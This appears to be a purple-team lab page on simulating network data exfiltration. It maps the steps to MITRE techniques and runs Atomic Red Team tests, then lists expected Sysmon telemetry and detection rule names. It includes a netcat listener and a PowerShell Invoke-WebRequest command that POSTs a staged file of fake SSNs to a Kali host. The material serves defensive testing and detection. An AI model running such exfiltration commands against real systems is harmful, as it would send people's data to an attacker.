# Exfiltration

Simulate data theft over the network (C2 upload, SMB, HTTP POST).

## MITRE mapping

| Technique | ID | Atomic test |
|-----------|-----|-------------|
| Exfiltration Over C2 Channel | T1041 | T1041 |
| Exfiltration Over Alternative Protocol: HTTP | T1048.003 | T1048.003 |
| Exfiltration Over Web Service | T1567.002 | — |

## Lab setup

On Kali, receive exfil:

```bash
mkdir -p /tmp/exfil && cd /tmp/exfil
python3 -m http.server 8080
# Or: nc -lvnp 8443
```

## Atomic Red Team (victim)

```powershell
cd C:\AtomicRedTeam\atomics

# T1048.003 — HTTP exfil (adjust URL to Kali)
Invoke-AtomicTest T1048.003 -TestNumbers 1

# T1041 — Exfil over C2 (simulated with curl/Invoke-WebRequest)
Invoke-AtomicTest T1041 -TestNumbers 1
```

## Manual (reproducible)

```powershell
# Stage fake sensitive data
1..1000 | ForEach-Object { "SSN:000-00-$_" } | Out-File C:\Users\labuser\Documents\staging.txt

# Exfil to Kali over host-only
Invoke-WebRequest -Uri "http://192.168.56.20:8080/upload" -Method POST -InFile "C:\Users\labuser\Documents\staging.txt"
```

## Expected telemetry

| Log source | Event ID | Evidence |
|------------|----------|----------|
| Sysmon | 3 | NetworkConnect to `192.168.56.20`, high bytes sent |
| Sysmon | 11 | Archive/staging file in Documents |
| Firewall | — | Outbound 8080 (if logging enabled) |

## Detection

- **DET-EXF-001** — Large outbound connection from user context
- **DET-EXF-002** — powershell/curl/certutil to non-corporate IP
- **DET-EXF-003** — Staging extensions (.zip, .7z) + immediate network

## Response pointer

`response/incident-response.md` → **Exfiltration**

## Kali verification

```bash
ls -la /tmp/exfil
# Confirm file received via HTTP logs
```

## Screenshot checklist

- [ ] Sysmon EID 3 DestinationIp=192.168.56.20
- [ ] DET-EXF-001 alert with bytes threshold
